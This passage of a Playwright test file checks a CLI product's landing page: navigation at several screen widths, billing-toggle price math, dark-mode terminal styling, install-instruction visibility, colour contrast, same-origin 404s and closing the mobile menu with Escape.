      overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      links: getComputedStyle(document.querySelector('.nav-links')).display,
    }));
    assert.equal(narrow.overflow, 0);
    assert.equal(narrow.links, 'none');

    await page.click('#nav-toggle');
    await page.click('#nav-panel a[href="#how"]');
    await page.waitForFunction(() => {
      const heading = document.querySelector('#how h2').getBoundingClientRect();
      const header = document.querySelector('header').getBoundingClientRect();
      const panel = document.getElementById('nav-panel');
      return panel.hasAttribute('hidden')
        && document.getElementById('nav-toggle').getAttribute('aria-expanded') === 'false'
        && heading.top >= header.bottom - 1
        && heading.top <= header.bottom + 180
        && heading.bottom <= window.innerHeight;
    });
    await page.goBack();
    await page.waitForFunction(() => location.hash === '' && window.scrollY < 40);

    await page.setViewportSize({ width: 1280, height: 900 });
    await open();
    await page.click('.nav-links a[href="#pricing"]');
    await page.waitForFunction(() => {
      const heading = document.querySelector('#pricing h2').getBoundingClientRect();
      const header = document.querySelector('header').getBoundingClientRect();
      return heading.top >= header.bottom - 1
        && heading.top <= header.bottom + 180
        && heading.bottom <= window.innerHeight;
    });

    const desktopNav = await page.evaluate(() => {
      const how = document.querySelector('.nav-links a[href="#how"]').getBoundingClientRect();
      const cta = document.querySelector('.nav-links .btn').getBoundingClientRect();
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        links: getComputedStyle(document.querySelector('.nav-links')).display,
        howH: how.height,
        ctaH: cta.height,
      };
    });
    assert.equal(desktopNav.overflow, 0);
    assert.equal(desktopNav.links, 'flex');
    assert.ok(desktopNav.howH < 32, `How it works height ${desktopNav.howH}`);
    assert.ok(desktopNav.ctaH < 60, `trial button height ${desktopNav.ctaH}`);
  });

  test('desktop nav stays a single row once it is shown, and the menu closes on resize', async () => {
    await page.setViewportSize({ width: 800, height: 800 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();
    const mid = await page.evaluate(() => ({
      overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
      links: getComputedStyle(document.querySelector('.nav-links')).display,
      toggle: getComputedStyle(document.getElementById('nav-toggle')).display,
    }));
    assert.equal(mid.overflow, 0);
    assert.equal(mid.links, 'none');
    assert.notEqual(mid.toggle, 'none');

    await page.click('#nav-toggle');
    await page.setViewportSize({ width: 1280, height: 800 });
    await page.waitForFunction(() => document.getElementById('nav-panel').hasAttribute('hidden'));
    await page.setViewportSize({ width: 375, height: 812 });
    const closed = await page.evaluate(() => document.getElementById('nav-panel').hasAttribute('hidden'));
    assert.equal(closed, true);

    await page.setViewportSize({ width: 900, height: 800 });
    const wide = await page.evaluate(() => {
      const how = document.querySelector('.nav-links a[href="#how"]').getBoundingClientRect();
      const cta = document.querySelector('.nav-links .btn').getBoundingClientRect();
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        howH: how.height,
        ctaH: cta.height,
      };
    });
    assert.equal(wide.overflow, 0);
    assert.ok(wide.howH < 32, `How it works height ${wide.howH}`);
    assert.ok(wide.ctaH < 60, `trial button height ${wide.ctaH}`);
  });

  test('billing toggle matches the annual math', async () => {
    await page.setViewportSize({ width: 1280, height: 900 });
    await open();
    assert.equal(await page.locator('#price-amount').innerText(), '$299');
    await page.click('#billing-annual');
    assert.equal(await page.locator('#price-amount').innerText(), '$249');
    assert.match(await page.locator('#price-subcopy').innerText(), /\$2,988\/yr/);
    assert.match(await page.locator('#price-subcopy').innerText(), /Save \$600\/yr/);
    assert.equal(await page.locator('#billing-annual').getAttribute('aria-selected'), 'true');
    assert.equal(await page.locator('#price-panel').getAttribute('aria-labelledby'), 'billing-annual');
    await page.click('#billing-monthly');
    assert.equal(await page.locator('#price-amount').innerText(), '$299');
    assert.match(await page.locator('#price-subcopy').innerText(), /\$249\/mo/);
    assert.equal(await page.locator('#billing-monthly').getAttribute('aria-selected'), 'true');
    assert.equal(await page.locator('#price-panel').getAttribute('aria-labelledby'), 'billing-monthly');
  });

  test('dark terminal is a distinct panel and 375 does not scroll sideways', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'dark' });
    await open();
    const dark = await page.evaluate(() => {
      const style = getComputedStyle(document.querySelector('.terminal'));
      return {
        overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
        body: getComputedStyle(document.body).backgroundColor,
        panel: style.backgroundColor,
        borderWidth: parseFloat(style.borderTopWidth),
      };
    });
    assert.equal(dark.overflow, 0);
    assert.ok(dark.borderWidth >= 1, 'dark terminal has no edge');
    const apart = distance(rgb(dark.body), rgb(dark.panel));
    assert.ok(apart >= 20, `terminal background ${dark.panel} blends into ${dark.body} (${apart})`);

    const commands = await page.locator('#terminal').innerText();
    assert.match(commands, /\$ et login\n\$ et site add\n\$ et round start\n\$ et status\nwinner: Clear price/);

    const winner = await page.evaluate(() => {
      const el = document.querySelector('.terminal .dim');
      const style = getComputedStyle(el);
      const rect = el.getBoundingClientRect();
      const term = document.querySelector('.terminal').getBoundingClientRect();
      return {
        text: el.textContent.trim(),
        opacity: Number(style.opacity),
        display: style.display,
        visibility: style.visibility,
        fontSize: parseFloat(style.fontSize),
        left: rect.left,
        right: rect.right,
        termLeft: term.left,
        termRight: term.right,
      };
    });
    assert.equal(winner.text, 'winner: Clear price');
    assert.equal(winner.display, 'inline');
    assert.equal(winner.visibility, 'visible');
    assert.ok(winner.opacity >= 0.99, `winner opacity ${winner.opacity}`);
    assert.ok(winner.fontSize >= 12, `winner font size ${winner.fontSize}`);
    assert.ok(winner.left >= winner.termLeft - 1 && winner.right <= winner.termRight + 1, 'winner line is clipped');
  });

  test('install files stay visible beside the terminal', async () => {
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      for (const width of [375, 1280]) {
        await page.setViewportSize({ width, height: width === 375 ? 812 : 900 });
        await open();
        const info = await page.evaluate(() => {
          const el = document.querySelector('.install-files');
          const term = document.getElementById('terminal');
          const style = getComputedStyle(el);
          const rect = el.getBoundingClientRect();
          let node = el;
          let bg = getComputedStyle(node).backgroundColor;
          while (node && (bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)')) {
            node = node.parentElement;
            bg = node ? getComputedStyle(node).backgroundColor : bg;
          }
          const code = el.querySelector('code');
          const codeStyle = code ? getComputedStyle(code) : null;
          const codeRect = code ? code.getBoundingClientRect() : null;
          let codeBg = codeStyle ? codeStyle.backgroundColor : bg;
          let codeNode = code;
          while (codeNode && (codeBg === 'transparent' || codeBg === 'rgba(0, 0, 0, 0)')) {
            codeNode = codeNode.parentElement;
            codeBg = codeNode ? getComputedStyle(codeNode).backgroundColor : codeBg;
          }
          const pageText = document.body.innerText
            .replace(/[\u00A0\u1680\u2000-\u200A\u202F\u205F\u3000]/g, ' ')
            .replace(/[\u200B-\u200D\uFEFF\u2060\u00AD]/g, '')
            .replace(/\s+/g, ' ')
            .toLowerCase();
          return {
            text: el.innerText,
            pageText,
            overflow: document.documentElement.scrollWidth - document.documentElement.clientWidth,
            display: style.display,
            visibility: style.visibility,
            opacity: Number(style.opacity),
            fontSize: parseFloat(style.fontSize),
            color: style.color,
            bg,
            beside: term.nextElementSibling === el,
            left: rect.left,
            right: rect.right,
            width: rect.width,
            innerWidth: window.innerWidth,
            codeText: code ? code.innerText : '',
            codeDisplay: codeStyle ? codeStyle.display : 'none',
            codeVisibility: codeStyle ? codeStyle.visibility : 'hidden',
            codeOpacity: codeStyle ? Number(codeStyle.opacity) : 0,
            codeFont: codeStyle ? parseFloat(codeStyle.fontSize) : 0,
            codeColor: codeStyle ? codeStyle.color : style.color,
            codeBg,
            codeHeight: codeRect ? codeRect.height : 0,
            codeLeft: codeRect ? codeRect.left : 0,
            codeRight: codeRect ? codeRect.right : 0,
          };
        });
        const where = `${scheme} ${width}`;
        assert.equal(info.overflow, 0, `${where} scrolls sideways`);
        assert.equal(info.beside, true, where);
        assert.equal(info.display, 'block', where);
        assert.equal(info.visibility, 'visible', where);
        assert.ok(info.opacity >= 0.99, `${where} opacity ${info.opacity}`);
        assert.ok(info.fontSize >= 12, `${where} font ${info.fontSize}`);
        assert.ok(info.width > 100, where);
        assert.ok(info.left >= -1 && info.right <= info.innerWidth + 1, `${where} install files clipped`);
        for (const name of INSTALL_FILES) assert.ok(hasInstallFile(info.text, name), `${where} ${name}`);
        assert.match(info.text, /The script picks the file for this machine\./);
        assert.ok(info.text.includes(CURL_INSTALL_LINE), `${where} install command not visible`);
        assert.equal(info.pageText.includes('gh release download'), false, `${where} shows gh release download`);
        assert.equal(info.pageText.includes('releases/download'), false, `${where} shows releases/download`);
        assert.equal(info.codeText.trim(), CURL_INSTALL_LINE, where);
        assert.notEqual(info.codeDisplay, 'none', where);
        assert.equal(info.codeVisibility, 'visible', where);
        assert.ok(info.codeOpacity >= 0.99, `${where} command opacity ${info.codeOpacity}`);
        assert.ok(info.codeFont >= 12, `${where} command font ${info.codeFont}`);
        assert.ok(info.codeHeight > 8, `${where} command height ${info.codeHeight}`);
        assert.ok(info.codeLeft >= -1 && info.codeRight <= info.innerWidth + 1, `${where} command clipped`);
        const ratio = contrastRatio(rgb(info.color), rgb(info.bg));
        assert.ok(ratio >= 4.5, `${where} install contrast ${ratio.toFixed(2)}`);
        const codeRatio = contrastRatio(rgb(info.codeColor), rgb(info.codeBg));
        assert.ok(codeRatio >= 4.5, `${where} command contrast ${codeRatio.toFixed(2)}`);
      }
    }
  });

  test('trial button text stays on the green fill', async () => {
    async function readButton(selector) {
      return page.evaluate((selector) => {
        const el = document.querySelector(selector);
        const style = getComputedStyle(el);
        return {
          color: style.color,
          bg: style.backgroundColor,
          padLeft: parseFloat(style.paddingLeft),
          padRight: parseFloat(style.paddingRight),
        };
      }, selector);
    }

    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      await page.setViewportSize({ width: 375, height: 812 });
      await open();
      await page.click('#nav-toggle');
      const mobile = await readButton('#nav-panel .btn');
      const mobileRatio = contrastRatio(rgb(mobile.color), rgb(mobile.bg));
      assert.ok(mobileRatio >= 4.5, `${scheme} mobile trial contrast ${mobileRatio.toFixed(2)}`);
      assert.ok(mobile.padLeft >= 16 && mobile.padRight >= 16, `${scheme} mobile trial padding ${mobile.padLeft} ${mobile.padRight}`);

      await page.setViewportSize({ width: 1280, height: 900 });
      await open();
      await page.hover('.nav-links .btn');
      const desk = await readButton('.nav-links .btn');
      const deskRatio = contrastRatio(rgb(desk.color), rgb(desk.bg));
      assert.ok(deskRatio >= 4.5, `${scheme} desktop trial hover contrast ${deskRatio.toFixed(2)}`);
    }
  });

  test('wordmark suffix and dogfood note meet contrast', async () => {
    for (const scheme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: scheme });
      await page.setViewportSize({ width: 375, height: 812 });
      await open();
      const sample = await page.evaluate(() => {
        function paint(el) {
          const color = getComputedStyle(el).color;
          let node = el;
          let bg = getComputedStyle(node).backgroundColor;
          while (node && (bg === 'transparent' || bg === 'rgba(0, 0, 0, 0)')) {
            node = node.parentElement;
            bg = node ? getComputedStyle(node).backgroundColor : bg;
          }
          return { color, bg };
        }
        return {
          mark: paint(document.querySelector('.logo span')),
          note: paint(document.getElementById('dogfood-note')),
          winner: paint(document.querySelector('.terminal .dim')),
        };
      });
      for (const [name, colors] of Object.entries(sample)) {
        const ratio = contrastRatio(rgb(colors.color), rgb(colors.bg));
        assert.ok(ratio >= 4.5, `${scheme} ${name} contrast ${ratio.toFixed(2)} ${colors.color} on ${colors.bg}`);
      }
    }
  });

  test('same-origin requests do not 404', async () => {
    const misses = [];
    const onResponse = (res) => {
      const url = new URL(res.url());
      if (url.hostname === '127.0.0.1' && res.status() >= 400) misses.push(`${url.pathname} ${res.status()}`);
    };
    page.on('response', onResponse);
    try {
      await page.setViewportSize({ width: 1280, height: 900 });
      await open();
      assert.deepEqual(misses, []);
    } finally {
      page.off('response', onResponse);
    }
  });

  test('escape closes the mobile menu', async () => {
    await page.setViewportSize({ width: 375, height: 812 });
    await page.emulateMedia({ colorScheme: 'light' });
    await open();
    await page.click('#nav-toggle');
    assert.equal(await page.locator('#nav-toggle').getAttribute('aria-expanded'), 'true');
    await page.keyboard.press('Escape');
    assert.equal(await page.locator('#nav-panel').getAttribute('hidden'), '');
    assert.equal(await page.locator('#nav-toggle').getAttribute('aria-expanded'), 'false');
  });
});
